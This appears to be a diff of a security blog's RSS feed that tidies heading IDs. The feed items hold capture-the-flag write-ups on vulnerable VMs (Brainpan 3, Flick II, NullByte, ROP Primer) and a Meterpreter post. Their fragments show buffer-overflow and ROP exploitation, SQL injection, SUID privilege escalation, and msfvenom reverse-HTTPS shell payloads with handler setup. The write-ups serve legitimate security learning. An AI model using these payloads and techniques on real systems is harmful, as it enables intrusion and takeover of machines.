 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
 
@@ -2871,7 +2543,7 @@ $ id
 uid=1001(puck) gid=1004(dev) groups=1001(puck)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;path-to-root:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Path to Root&lt;/h2&gt;
+&lt;h2 id=&#34;path-to-root&#34;&gt;Path to Root&lt;/h2&gt;
 
 &lt;p&gt;Now that we can read inside &lt;code&gt;puck&#39;s&lt;/code&gt; home directory, we can get the content of &lt;code&gt;key.txt&lt;/code&gt;.  I found it handy to grab this in case I lost shell access - you can write the content into &lt;code&gt;/mnt/usb/key.txt&lt;/code&gt; so you don&amp;rsquo;t have to win the race condition over again.&lt;/p&gt;
 
@@ -2897,7 +2569,7 @@ $ ls -l /usr/local/bin/msg_admin
 -rwxr-xr-x 1 root root 12316 May 31 04:46 /usr/local/bin/msg_admin
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;a-heap-of-trouble:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Heap of Trouble&lt;/h2&gt;
+&lt;h2 id=&#34;a-heap-of-trouble&#34;&gt;A Heap of Trouble&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./msg_admin 
 Usage: ./msg_admin priority message.txt
@@ -3281,7 +2953,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 &lt;p&gt;So it works on my local box - I just copied &lt;code&gt;/bin/sh&lt;/code&gt; as a simple test.  Time to copy &lt;code&gt;message.txt&lt;/code&gt; across to bp3 (again with &lt;code&gt;xxd&lt;/code&gt;).  For the cronjob to pick it up, it must be within &lt;code&gt;/opt/.messenger/&lt;/code&gt; and have the &lt;code&gt;.msg&lt;/code&gt; extension.  You know the job has run, because after the message has been processed, it gets deleted.&lt;/p&gt;
 
-&lt;h2 id=&#34;failed:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Failed?&lt;/h2&gt;
+&lt;h2 id=&#34;failed&#34;&gt;Failed?&lt;/h2&gt;
 
 &lt;p&gt;My &lt;code&gt;/tmp/foo&lt;/code&gt; payload on bp3 was to create a SUID shell.&lt;/p&gt;
 
@@ -3388,8 +3060,7 @@ TESTERS
        Swappage - https://twitter.com/Swappage
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;I am now going on an extended leave of absense to recover.&lt;/p&gt;
-</description>
+&lt;p&gt;I am now going on an extended leave of absense to recover.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -3398,11 +3069,11 @@ TESTERS
       <pubDate>Sat, 19 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/brainpan-3-part-1/</guid>
-      <description>
+      <description>&lt;p&gt;As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&amp;rsquo;s 1 &amp;amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s&lt;/p&gt;
 
-&lt;p&gt;As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&amp;rsquo;s 1 &amp;amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;port-scan:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Port Scan&lt;/h2&gt;
+&lt;h2 id=&#34;port-scan&#34;&gt;Port Scan&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -T5 192.168.56.105
 
@@ -3412,7 +3083,7 @@ PORT     STATE  SERVICE
 8080/tcp closed http-proxy
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;access-code:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Access Code&lt;/h2&gt;
+&lt;h2 id=&#34;access-code&#34;&gt;Access Code&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.105 1337
 
@@ -3507,7 +3178,7 @@ total 0
 -rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;session-name:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Session Name&lt;/h2&gt;
+&lt;h2 id=&#34;session-name&#34;&gt;Session Name&lt;/h2&gt;
 
 &lt;p&gt;We have this banner across the top.&lt;/p&gt;
 
@@ -3591,7 +3262,7 @@ Aborted (core dumped)
 
 &lt;p&gt;It&amp;rsquo;s at this point we have to take a step back, without the actual binary to analyse I couldn&amp;rsquo;t see a way of progressing this further.&lt;/p&gt;
 
-&lt;h2 id=&#34;some-trolls:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Some Trolls&lt;/h2&gt;
+&lt;h2 id=&#34;some-trolls&#34;&gt;Some Trolls&lt;/h2&gt;
 
 &lt;p&gt;Option &lt;code&gt;2  - VIEW CODE REPOSITORY&lt;/code&gt; opens up port &lt;code&gt;8080&lt;/code&gt; that we saw closed earlier.&lt;/p&gt;
 
@@ -3646,7 +3317,7 @@ Aborted (core dumped)
      here&#39;s your shell
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;report:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Report&lt;/h2&gt;
+&lt;h2 id=&#34;report&#34;&gt;Report&lt;/h2&gt;
 
 &lt;p&gt;The &lt;code&gt;report&lt;/code&gt; binary is really where we need to focus our effort.&lt;/p&gt;
 
@@ -3712,7 +3383,7 @@ gdb-peda$ x/s 0x8048e98
 
 &lt;p&gt;So the hostname of the machine has to be &lt;code&gt;brainpan3&lt;/code&gt; before it&amp;rsquo;ll go any further.  I&amp;rsquo;m sure you could just NOP it out in gdb, or just change the hostname of your machine.  With that now working, I ran the binary twice.&lt;/p&gt;
 
-&lt;h2 id=&#34;bof-ing:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;BoF&amp;rsquo;ing&lt;/h2&gt;
+&lt;h2 id=&#34;bof-ing&#34;&gt;BoF&amp;rsquo;ing&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@brainpan3:~/bp3# ./report test 1
 [+] WRITING REPORT TO /home/anansi/REPORTS/20150919213852.rep
@@ -3886,7 +3557,7 @@ $ id
 uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;reynard:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Reynard&lt;/h2&gt;
+&lt;h2 id=&#34;reynard&#34;&gt;Reynard&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /home/reynard/private
 total 16
@@ -4042,8 +3713,7 @@ Segmentation fault (core dumped)
 $ ./cryptor $(./cryptor.py)
 $ id
 uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -4052,11 +3722,11 @@ uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
       <pubDate>Tue, 08 Sep 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/flick-ii/</guid>
-      <description>
+      <description>&lt;p&gt;After the success of &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick: I&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/leonjza&#34;&gt;@leonjza&lt;/a&gt; decided that VulnHub needed a fresh dose of pain and suffering.  &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Flick: II&lt;/a&gt; is a vulnerable machine with a mobile twist - it requires the attacker to wrestle with a custom Android application to breach the VM.  I was more than complimentary about it on &lt;a href=&#34;https://twitter.com/_RastaMouse/status/638789930261585921&#34;&gt;Twitter&lt;/a&gt; - it&amp;rsquo;s definitely worth checking out.&lt;/p&gt;
 
-&lt;p&gt;After the success of &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick: I&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/leonjza&#34;&gt;@leonjza&lt;/a&gt; decided that VulnHub needed a fresh dose of pain and suffering.  &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Flick: II&lt;/a&gt; is a vulnerable machine with a mobile twist - it requires the attacker to wrestle with a custom Android application to breach the VM.  I was more than complimentary about it on &lt;a href=&#34;https://twitter.com/_RastaMouse/status/638789930261585921&#34;&gt;Twitter&lt;/a&gt; - it&amp;rsquo;s definitely worth checking out.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;https:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;HTTPS&lt;/h2&gt;
+&lt;h2 id=&#34;https&#34;&gt;HTTPS&lt;/h2&gt;
 
 &lt;p&gt;After a bit of port scanning we find that only port 443 is open.&lt;/p&gt;
 
@@ -4089,7 +3759,7 @@ uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
 
 &lt;p&gt;Time to have a look at the Android application.&lt;/p&gt;
 
-&lt;h2 id=&#34;apk:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;APK&lt;/h2&gt;
+&lt;h2 id=&#34;apk&#34;&gt;APK&lt;/h2&gt;
 
 &lt;p&gt;I used the Android Studio emulator to run the application.  After creating an AVD in the Studio, I wrote the following &lt;code&gt;BAT&lt;/code&gt; files.&lt;/p&gt;
 
@@ -4222,7 +3892,7 @@ bash-4.2$ id
 uid=998(nginx) gid=997(nginx) groups=997(nginx)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;robin:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Robin&lt;/h2&gt;
+&lt;h2 id=&#34;robin&#34;&gt;Robin&lt;/h2&gt;
 
 &lt;p&gt;The apk has an advertised capability to execute commands over SSH as well as HTTPS.  But since SSH doesn&amp;rsquo;t seem to be enabled on the VM, this doesn&amp;rsquo;t work.  However, there is functional code within the application to establish an SSH connection, but the credentials are rather obscure.&lt;/p&gt;
 
@@ -4311,7 +3981,7 @@ python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
 uid=1000(robin) gid=1000(robin) groups=1000(robin)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;bryan:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Bryan&lt;/h2&gt;
+&lt;h2 id=&#34;bryan&#34;&gt;Bryan&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ ls -l
 -rw-r--r-- 1 robin robin 1617 Jul 23 21:35 debug.gpg
@@ -4397,7 +4067,7 @@ Dice said: 4444
 uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;sean:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Sean&lt;/h2&gt;
+&lt;h2 id=&#34;sean&#34;&gt;Sean&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;/usr/local/bin/&lt;/code&gt; actually contains 4 binaries.&lt;/p&gt;
 
@@ -4530,7 +4200,7 @@ uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)
 sean
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;root:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Root&lt;/h2&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
 
 &lt;p&gt;Up next is &lt;code&gt;-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore&lt;/code&gt;.  Trying to run it as we are results in a fail.&lt;/p&gt;
 
@@ -4749,7 +4419,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
 root
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat /root/flag
 
@@ -4772,8 +4442,7 @@ root
  #vulnhub or on twitter @leonjza
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Many thanks to leonjza for a brilliant VM - one of my favourites to date.  Shout-out to &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; for his excellent &lt;a href=&#34;http://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/&#34;&gt;64-bit Stack Smashing Tutorial&lt;/a&gt; which came in super-handy for this final exercise.&lt;/p&gt;
-</description>
+&lt;p&gt;Many thanks to leonjza for a brilliant VM - one of my favourites to date.  Shout-out to &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; for his excellent &lt;a href=&#34;http://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/&#34;&gt;64-bit Stack Smashing Tutorial&lt;/a&gt; which came in super-handy for this final exercise.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -4782,11 +4451,11 @@ root
       <pubDate>Fri, 21 Aug 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/nullbyte-0x01/</guid>
-      <description>
+      <description>&lt;p&gt;NullByte is a hacking challenge created by &lt;a href=&#34;https://twitter.com/@ly0nx&#34;&gt;ly0n&lt;/a&gt;, pitched at a beginner-intermediate level.  The objective is to grab the flag.&lt;/p&gt;
 
-&lt;p&gt;NullByte is a hacking challenge created by &lt;a href=&#34;https://twitter.com/@ly0nx&#34;&gt;ly0n&lt;/a&gt;, pitched at a beginner-intermediate level.  The objective is to grab the flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;port-scan:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;Port Scan&lt;/h2&gt;
+&lt;h2 id=&#34;port-scan&#34;&gt;Port Scan&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -A 192.168.56.102
 
@@ -4908,7 +4577,7 @@ EMP POSITION : employee
 Fetched data successfully
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;sqli:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;SQLi&lt;/h2&gt;
+&lt;h2 id=&#34;sqli&#34;&gt;SQLi&lt;/h2&gt;
 
 &lt;p&gt;I threw &lt;code&gt;sqlmap&lt;/code&gt; at the page, to try injections in the &lt;code&gt;usrtosearch&lt;/code&gt; field. Luckily, it returned a few blind-based possible injections.&lt;/p&gt;
 
@@ -4965,7 +4634,7 @@ Loaded 1 password hash (Raw-MD5 [MD5 32/32])
 omega            (?)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;ssh:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;SSH&lt;/h2&gt;
+&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
 
 &lt;p&gt;The credentials &lt;code&gt;ramses:omega&lt;/code&gt; can also be used to log in via SSH, remember on port 777.&lt;/p&gt;
 
@@ -4976,7 +4645,7 @@ ramses@NullByte:~$ pwd
 /home/ramses
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;procwatch-suid:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;procwatch SUID&lt;/h2&gt;
+&lt;h2 id=&#34;procwatch-suid&#34;&gt;procwatch SUID&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;.bash_history&lt;/code&gt; has references to &lt;code&gt;/var/www/backup/procwatch&lt;/code&gt;, which turns out to be a SUID binary owned by &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
 
@@ -5094,7 +4763,7 @@ uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
 root
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/proof.txt
 adf11c7a9e6523e630aaf3b9b7acb51d
@@ -5110,8 +4779,7 @@ USE THIS PGP PUBLIC KEY
 -----BEGIN PGP PUBLIC KEY BLOCK-----
 [...snip...]
 -----END PGP PUBLIC KEY BLOCK-----
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -5120,9 +4788,9 @@ USE THIS PGP PUBLIC KEY
       <pubDate>Thu, 23 Jul 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/rop-primer-level-0/</guid>
-      <description>
+      <description>&lt;p&gt;This VM is meant as a small introduction to 32-bit return-oriented-programming on Linux. It contains three vulnerable binaries, that must be exploited using ROP. There are three levels in total (0 to 2).&lt;/p&gt;
 
-&lt;p&gt;This VM is meant as a small introduction to 32-bit return-oriented-programming on Linux. It contains three vulnerable binaries, that must be exploited using ROP. There are three levels in total (0 to 2).&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;The VM is running a webserver with some instructions on how to get started with level0, by SSH’ing in.&lt;/p&gt;
 
@@ -5234,7 +4902,7 @@ Start      End        Perm    Name
 0xbffdf000 0xc0000000 rw-p    [stack]
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;mprotect:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;mprotect&lt;/h2&gt;
+&lt;h2 id=&#34;mprotect&#34;&gt;mprotect&lt;/h2&gt;
 
 &lt;p&gt;These are the areas of memory, none of which are executable (donated by the &lt;code&gt;x&lt;/code&gt; character). I’m going to make part of the &lt;code&gt;[stack]&lt;/code&gt; region executable, so let’s start building our exploit.&lt;/p&gt;
 
@@ -5310,7 +4978,7 @@ rop += &amp;quot;BBBB&amp;quot;
 0xbffdf000 0xbffe0000 rwxp    mapped
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;read:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;read&lt;/h2&gt;
+&lt;h2 id=&#34;read&#34;&gt;read&lt;/h2&gt;
 
 &lt;p&gt;Now we can set up our ROP to &lt;code&gt;read&lt;/code&gt;. This will allow us to read shellcode from &lt;code&gt;stdin&lt;/code&gt; into our mapped area of the stack, and execute.&lt;/p&gt;
 
@@ -5358,7 +5026,7 @@ rop += &amp;quot;BBBB&amp;quot;
 0x42424242 in ?? ()
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;stdin:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;stdin&lt;/h2&gt;
+&lt;h2 id=&#34;stdin&#34;&gt;stdin&lt;/h2&gt;
 
 &lt;p&gt;Now we need to test that we can actually read something in from stdin and have it execute. We’ll replace &lt;code&gt;BBBB&lt;/code&gt; with the address of our executable stack location and run the exploit outside gdb.&lt;/p&gt;
 
@@ -5414,12 +5082,11 @@ level1
 
 &lt;p&gt;The additional &lt;code&gt;cat&lt;/code&gt; keeps the shell alive.&lt;/p&gt;
 
-&lt;h2 id=&#34;flag:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat flag
 flag{rop_the_night_away}
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -5428,13 +5095,13 @@ flag{rop_the_night_away}
       <pubDate>Tue, 21 Jul 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/guff/2015/paranoid-meterpreter/</guid>
-      <description>
+      <description>&lt;p&gt;There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from &lt;a href=&#34;https://twitter.com/TheColonial&#34;&gt;OJ&lt;/a&gt;, entitled &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers&#34;&gt;The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers&lt;/a&gt;. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.&lt;/p&gt;
 
-&lt;p&gt;There I was, minding my own business… Casually scrolling down my Twitter feed when I noticed a post from &lt;a href=&#34;https://twitter.com/TheColonial&#34;&gt;OJ&lt;/a&gt;, entitled &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers&#34;&gt;The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers&lt;/a&gt;. A bit of a mouthful, it summerises the difference between the WinInet and WinHTTP API’s and what that means for Meterpreter.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;Go ahead and check out that post for the gorey details. I was particularly interested in a feature called ‘Paranoid Meterpreter’, which is basically a means of preventing other people from hijacking your juicy, hard earned shells. This post is a simplistic example of how a Meterpreter shell can be hijacked and how this can be prevented. You can also read HD Moore’s original article &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;the-setup:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;The Setup&lt;/h2&gt;
+&lt;h2 id=&#34;the-setup&#34;&gt;The Setup&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;1 x Windows 7: Victim (192.168.56.102)&lt;/li&gt;
@@ -5455,16 +5122,16 @@ flag{rop_the_night_away}
 
 &lt;p&gt;The two payloads don’t appear all that different in the Metasploit Framework and they appear to functional identically if you are not using any of the differentiating features from the respective APIs.&lt;/p&gt;
 
-&lt;h2 id=&#34;scenario-1-wininet:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Scenario 1: WinInet&lt;/h2&gt;
+&lt;h2 id=&#34;scenario-1-wininet&#34;&gt;Scenario 1: WinInet&lt;/h2&gt;
 
 &lt;p&gt;This is the payload the majority of people will likely be familar with, not least because it has been present in the framework for longer.&lt;/p&gt;
 
-&lt;h3 id=&#34;generate-the-payload:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Generate the Payload&lt;/h3&gt;
+&lt;h3 id=&#34;generate-the-payload&#34;&gt;Generate the Payload&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p windows/meterpreter/reverse_https LHOST=kali LPORT=443 -f exe -o /root/wininet.exe
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;handler-exploit:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
+&lt;h2 id=&#34;handler-exploit&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/multi/handler
 msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_https
@@ -5491,17 +5158,17 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;The would-be attacker (.101) gets the shell. This is because there is no mutual validation between the stager and the handler.&lt;/p&gt;
 
-&lt;h2 id=&#34;scenario-2-winhttp:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Scenario 2: WinHTTP&lt;/h2&gt;
+&lt;h2 id=&#34;scenario-2-winhttp&#34;&gt;Scenario 2: WinHTTP&lt;/h2&gt;
 
 &lt;p&gt;This API enables Meterpreter to verify the SHA1 hash of the SSL certificate presented by the Framework. This requirement is enforced by both the handler and payload stager.&lt;/p&gt;
 
-&lt;h3 id=&#34;generate-an-ssl-cert:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Generate an SSL Cert&lt;/h3&gt;
+&lt;h3 id=&#34;generate-an-ssl-cert&#34;&gt;Generate an SSL Cert&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout meterpreter.key -out meterpreter.crt
 cat meterpreter.key meterpreter.crt &amp;gt; meterpreter.pem
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;generate-the-payload-1:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Generate the Payload&lt;/h2&gt;
+&lt;h2 id=&#34;generate-the-payload-1&#34;&gt;Generate the Payload&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p windows/meterpreter/reverse_winhttps LHOST=kali LPORT=443 HandlerSSLCert=meterpreter.pem StagerVerifySSLCert=true -f exe -o winhttps.exe
 
@@ -5509,7 +5176,7 @@ cat meterpreter.key meterpreter.crt &amp;gt; meterpreter.pem
 [*] Writing 73802 bytes to /root/winhttps.exe...
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;handler-exploit-1:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
+&lt;h2 id=&#34;handler-exploit-1&#34;&gt;Handler &amp;amp; Exploit&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use exploit/multi/handler
 msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_winhttps
@@ -5541,12 +5208,11 @@ msf exploit(handler) &amp;gt; run
 
 &lt;p&gt;Because the other attacker does not have the SSL cert, they cannot validate themselves to the Stager and the Meterpreter session closes.&lt;/p&gt;
 
-&lt;h2 id=&#34;moar-paranoia:f3f1e512da087be2580e1e7c8828bf5c&#34;&gt;Moar Paranoia&lt;/h2&gt;
+&lt;h2 id=&#34;moar-paranoia&#34;&gt;Moar Paranoia&lt;/h2&gt;
 
 &lt;p&gt;It’s possible to take this level of paranoia to the next level using UUID validation. In the examples above, we can see that &amp;lsquo;random&amp;rsquo; UUID names are given.  &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Payload-UUID&#34;&gt;More info here&lt;/a&gt;. But payloads can be assigned specific UUIDs using &lt;code&gt;PayloadUUIDTracking=true&lt;/code&gt; and &lt;code&gt;PayloadUUIDName=&amp;lt;name&amp;gt;&lt;/code&gt; parameters.&lt;/p&gt;
 
-&lt;p&gt;The handler can be given the &lt;code&gt;IgnoreUnknownPayloads&lt;/code&gt; true parameter, so that it will only accept stagers with your own whitelisted UUIDs.&lt;/p&gt;
-</description>
+&lt;p&gt;The handler can be given the &lt;code&gt;IgnoreUnknownPayloads&lt;/code&gt; true parameter, so that it will only accept stagers with your own whitelisted UUIDs.&lt;/p&gt;</description>
     </item>
     
   </channel>
